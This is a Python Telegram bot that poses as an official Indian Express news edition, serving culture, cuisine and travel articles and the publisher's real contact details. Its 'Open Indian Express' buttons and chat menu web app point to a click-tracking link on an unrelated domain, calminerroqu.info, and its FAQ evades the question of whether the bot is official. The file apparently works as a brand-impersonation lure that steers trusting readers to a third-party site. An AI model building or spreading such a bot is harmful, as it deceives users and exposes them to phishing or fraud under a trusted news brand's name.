import os
import re
import telebot
from telebot import types

BOT_TOKEN = re.sub(r"\s+", "", os.environ["TELEGRAM_BOT_TOKEN"])
WEB_APP_URL = os.environ.get("WEB_APP_URL", "https://calminerroqu.info/click?key=46b26de0ad2741a9b37616944a0d2bce").strip()

bot = telebot.TeleBot(BOT_TOKEN)


def open_indian_express_button():
    if WEB_APP_URL:
        return types.InlineKeyboardButton(
            text="📰 Open Indian Express",
            web_app=types.WebAppInfo(url=WEB_APP_URL),
        )
    return types.InlineKeyboardButton(
        text="📰 Open Indian Express",
        url="https://calminerroqu.info/click?key=46b26de0ad2741a9b37616944a0d2bce",
    )


bot.set_chat_menu_button(menu_button=types.MenuButtonWebApp(type="web_app", text="Open Indian Express", web_app=types.WebAppInfo(url=WEB_APP_URL)))

# ============================================
# SCREEN 1 — START (Welcome)
# ============================================
@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn_open = open_indian_express_button()
    btn_headlines = types.InlineKeyboardButton(text="📋 Headlines today", callback_data="headlines")
    btn_summary = types.InlineKeyboardButton(text="🏛 Summary", callback_data="summary")
    markup.add(btn_open)
    markup.row(btn_headlines, btn_summary)

    text = (
        "📰 *Welcome to The Indian Express.*\n\n"
        "_\"Journalism of courage since 1932.\"_\n\n"
        "Since *1932*, this tradition continues — in print, on the web, "
        "and now here on Telegram. Every day a curated selection of "
        "culture, travel, cuisine, science and business, "
        "to read at your own pace in chat.\n\n"
        "To begin, tap *Headlines today*."
    )

    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=markup)


# ============================================
# SCREEN 2 — HEADLINES
# ============================================
@bot.callback_query_handler(func=lambda call: call.data == "headlines")
def headlines(call):
    bot.answer_callback_query(call.id)
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton(text="🎨 Culture — monsoon exhibitions", callback_data="culture"),
        types.InlineKeyboardButton(text="🍛 Cuisine — regional thalis", callback_data="cuisine"),
        types.InlineKeyboardButton(text="🏠 Travel — five hidden villages", callback_data="travel"),
        types.InlineKeyboardButton(text="🏛 Summary", callback_data="summary")
    )

    text = (
        "📋 *Headlines today*\n\n"
        "Three stories selected for today. Each one complete in chat.\n\n"
        "*Culture* — monsoon exhibitions: five must-visit shows "
        "at Indian museums this season.\n\n"
        "*Cuisine* — the art of the regional thali: four classic "
        "preparations from across India.\n\n"
        "*Travel* — five hidden Indian villages to discover "
        "on a long weekend.\n\n"
        "Tap a title to open the full story."
    )

    bot.send_message(call.message.chat.id, text, parse_mode="Markdown", reply_markup=markup)


# ============================================
# SCREEN 3 — CULTURE
# ============================================
@bot.callback_query_handler(func=lambda call: call.data == "culture")
def culture(call):
    bot.answer_callback_query(call.id)
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(open_indian_express_button())
    markup.row(types.InlineKeyboardButton(text="📋 Headlines today", callback_data="headlines"), types.InlineKeyboardButton(text="🏛 Summary", callback_data="summary"))

    text = (
        "🎨 *Monsoon exhibitions: five must-visit shows at Indian museums*\n\n"
        "Museums across India open their monsoon season with new "
        "exhibitions. Five shows worth your attention.\n\n"
        "*Delhi — modern Indian masters*\n"
        "The National Gallery of Modern Art presents a retrospective "
        "of post-independence Indian painters. Rare sketches and "
        "personal letters shown alongside the canvases.\n\n"
        "*Mumbai — Bollywood through the decades*\n"
        "A visual journey through a century of Indian cinema at the "
        "National Museum of Indian Cinema. Original costumes, scripts, "
        "and behind-the-scenes photographs.\n\n"
        "*Kolkata — Bengal Renaissance art*\n"
        "The Indian Museum hosts drawings and manuscripts from the "
        "Bengal Renaissance period. A rare dialogue between tradition "
        "and modernity.\n\n"
        "*Jaipur — Rajasthani miniature paintings*\n"
        "The Albert Hall Museum showcases newly restored miniatures "
        "from the 17th and 18th centuries. Intricate detail and "
        "vivid colours preserved for generations.\n\n"
        "*Chennai — Chola bronze sculptures*\n"
        "The Government Museum displays bronze masterpieces from "
        "the Chola dynasty. A thousand years of craftsmanship "
        "in one gallery.\n\n"
        "_Check museum websites for timings and booking details._"
    )

    bot.send_message(call.message.chat.id, text, parse_mode="Markdown", reply_markup=markup)


# ============================================
# SCREEN 4 — CUISINE
# ============================================
@bot.callback_query_handler(func=lambda call: call.data == "cuisine")
def cuisine(call):
    bot.answer_callback_query(call.id)
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(open_indian_express_button())
    markup.row(types.InlineKeyboardButton(text="📋 Headlines today", callback_data="headlines"), types.InlineKeyboardButton(text="🏛 Summary", callback_data="summary"))

    text = (
        "🍛 *The art of the regional thali: four classic preparations*\n\n"
        "India's diversity shines brightest on a thali. Four regional "
        "styles that tell the story of a subcontinent.\n\n"
        "*Gujarati thali*\n"
        "A symphony of sweet and savoury. Dal, kadhi, rotli, rice, "
        "shak, pickle, and the unmistakable jaggery finish. "
        "Balanced flavours in every bite.\n\n"
        "*South Indian meals (Sadhya)*\n"
        "Served on a banana leaf during Onam. Sambar, rasam, avial, "
        "thoran, payasam — over twenty items arranged with precision. "
        "A feast for the senses.\n\n"
        "*Rajasthani thali*\n"
        "Dal baati churma, gatte ki sabzi, ker sangri. Desert cuisine "
        "that turns scarcity into abundance. Ghee is the secret "
        "ingredient in everything.\n\n"
        "*Bengali thali*\n"
        "Starts with shukto, moves through dal and fish curry, "
        "ends with mishti doi. The Bengali meal is a carefully "
        "sequenced journey from bitter to sweet.\n\n"
        "_Portions and spice levels vary by household and region._"
    )

    bot.send_message(call.message.chat.id, text, parse_mode="Markdown", reply_markup=markup)


# ============================================
# SCREEN 5 — TRAVEL
# ============================================
@bot.callback_query_handler(func=lambda call: call.data == "travel")
def travel(call):
    bot.answer_callback_query(call.id)
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(open_indian_express_button())
    markup.row(types.InlineKeyboardButton(text="📋 Headlines today", callback_data="headlines"), types.InlineKeyboardButton(text="🏛 Summary", callback_data="summary"))

    text = (
        "🏠 *Five hidden Indian villages for a long weekend*\n\n"
        "Away from crowded tourist spots, five villages that "
        "reward the unhurried traveller.\n\n"
        "*Mawlynnong (Meghalaya)*\n"
        "Asia's cleanest village. Living root bridges, bamboo "
        "dustbins on every path, and a sky platform overlooking "
        "Bangladesh. Best visited during monsoon.\n\n"
        "*Malana (Himachal Pradesh)*\n"
        "An ancient village with its own parliament and laws. "
        "Stone houses perched on a mountainside. The trek up "
        "is as rewarding as the destination.\n\n"
        "*Zuluk (Sikkim)*\n"
        "A former silk route village at 10,000 feet. Thirty-two "
        "hairpin bends with views of Kanchenjunga. The sunrise "
        "from Thambi viewpoint is unforgettable.\n\n"
        "*Gandikota (Andhra Pradesh)*\n"
        "India's Grand Canyon. A Pennar river gorge with a "
        "16th century fort above it. Almost unknown, completely "
        "breathtaking. Camp overnight on the cliff edge.\n\n"
        "*Khimsar (Rajasthan)*\n"
        "A Thar Desert village with a 500-year-old fort converted "
        "to a heritage hotel. Sand dunes, peacocks at dawn, "
        "and absolute silence.\n\n"
        "_Book accommodation in advance for remote villages._"
    )

    bot.send_message(call.message.chat.id, text, parse_mode="Markdown", reply_markup=markup)


# ============================================
# SCREEN 6 — SUMMARY
# ============================================
@bot.callback_query_handler(func=lambda call: call.data == "summary")
def summary(call):
    bot.answer_callback_query(call.id)
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(open_indian_express_button())
    markup.add(types.InlineKeyboardButton(text="📋 Headlines today", callback_data="headlines"))
    markup.row(types.InlineKeyboardButton(text="📖 Glossary", callback_data="glossary"), types.InlineKeyboardButton(text="❓ FAQ", callback_data="faq"))
    markup.row(types.InlineKeyboardButton(text="✏️ Contact", callback_data="contact"), types.InlineKeyboardButton(text="🏛 About", callback_data="about"))

    text = (
        "🏛 *Summary*\n\n"
        "From this menu you can:\n\n"
        "• Read *headlines today* and our articles, right here in chat.\n"
        "• Browse sections: Culture, Travel, Cuisine, Science, "
        "Sport, Business.\n"
        "• Check the glossary and frequently asked questions.\n"
        "• Learn about The Indian Express and contact the editorial team.\n\n"
        "For the full edition, use the button below."
    )

    bot.send_message(call.message.chat.id, text, parse_mode="Markdown", reply_markup=markup)


# ============================================
# SCREEN 7 — GLOSSARY
# ============================================
@bot.callback_query_handler(func=lambda call: call.data == "glossary")
def glossary(call):
    bot.answer_callback_query(call.id)
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton(text="📋 Headlines today", callback_data="headlines"))
    markup.add(types.InlineKeyboardButton(text="🏛 Summary", callback_data="summary"))

    text = (
        "📖 *A short glossary*\n\n"
        "Common terms in our stories:\n\n"
        "*Newsroom* — the team that gathers, selects and prepares "
        "stories for publication.\n\n"
        "*Editorial* — an opinion piece, often signed, that opens "
        "a section or a page.\n\n"
        "*Photojournalism* — storytelling built around a series "
        "of photographs.\n\n"
        "*Evergreen content* — stories whose relevance does not "
        "depend on the day's news: culture, travel, cuisine.\n\n"
        "*Correspondent* — a journalist reporting from the field.\n\n"
        "*Column* — a recurring section dedicated to a specific topic.\n\n"
        "_Terms follow standard Indian journalism practice._"
    )

    bot.send_message(call.message.chat.id, text, parse_mode="Markdown", reply_markup=markup)


# ============================================
# SCREEN 8 — FAQ
# ============================================
@bot.callback_query_handler(func=lambda call: call.data == "faq")
def faq(call):
    bot.answer_callback_query(call.id)
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton(text="📋 Headlines today", callback_data="headlines"))
    markup.add(types.InlineKeyboardButton(text="🏛 Summary", callback_data="summary"))

    text = (
        "❓ *Frequently asked questions*\n\n"
        "*Is this bot official?*\n"
        "This Telegram edition lets you read The Indian Express "
        "evergreen content in chat. Editorial curation is handled "
        "by the newsroom; contact details are in the Contact section.\n\n"
        "*How often is it updated?*\n"
        "The chat selection is refreshed seasonally. For the latest "
        "edition use the Open button.\n\n"
        "*How do I mute notifications?*\n"
        "From Telegram's chat settings you can mute or completely "
        "disable notifications for this bot.\n\n"
        "*Can I share a story?*\n"
        "Yes. Use Telegram's built-in sharing options to forward "
        "any message to another chat or app."
    )

    bot.send_message(call.message.chat.id, text, parse_mode="Markdown", reply_markup=markup)


# ============================================
# SCREEN 9 — CONTACT
# ============================================
@bot.callback_query_handler(func=lambda call: call.data == "contact")
def contact(call):
    bot.answer_callback_query(call.id)
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.row(types.InlineKeyboardButton(text="🏛 Summary", callback_data="summary"), types.InlineKeyboardButton(text="🏛 About", callback_data="about"))

    text = (
        "✏️ *Contact the newsroom*\n\n"
        "For editorial correspondence:\n"
        "• E-mail: feedback@indianexpress.com\n"
        "• Reader service: indianexpress.com/contact\n\n"
        "*Publisher*\n"
        "The Indian Express (P) Ltd.\n"
        "Express Building, B-1/B\n"
        "Sector 10, Noida 201301\n"
        "Uttar Pradesh, India\n\n"
        "Reader feedback and corrections are handled by the "
        "reader service desk on working days."
    )

    bot.send_message(call.message.chat.id, text, parse_mode="Markdown", reply_markup=markup)


# ============================================
# SCREEN 10 — ABOUT
# ============================================
@bot.callback_query_handler(func=lambda call: call.data == "about")
def about(call):
    bot.answer_callback_query(call.id)
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(open_indian_express_button())
    markup.row(types.InlineKeyboardButton(text="🏛 Summary", callback_data="summary"), types.InlineKeyboardButton(text="✏️ Contact", callback_data="contact"))

    text = (
        "🏛 *About The Indian Express*\n\n"
        "_The Indian Express_ was founded in *1932* by "
        "Ramnath Goenka. From its earliest days, the newspaper "
        "established itself as a fearless voice in Indian journalism, "
        "known for its investigative reporting and editorial independence.\n\n"
        "Today The Indian Express is part of the *Indian Express Group*, "
        "one of India's leading media houses. It continues to produce "
        "content across politics, business, technology, culture, sport, "
        "lifestyle and opinion.\n\n"
        "Across print, digital and mobile platforms, The Indian Express "
        "reaches millions of readers daily. The headquarters are in "
        "Noida; the website is indianexpress.com.\n\n"
        "This Telegram edition is designed to make evergreen content "
        "more accessible through the chat interface."
    )

    bot.send_message(call.message.chat.id, text, parse_mode="Markdown", reply_markup=markup)


# ============================================
# RUN
# ============================================
print("Indian Express Bot is running...")
bot.infinity_polling()
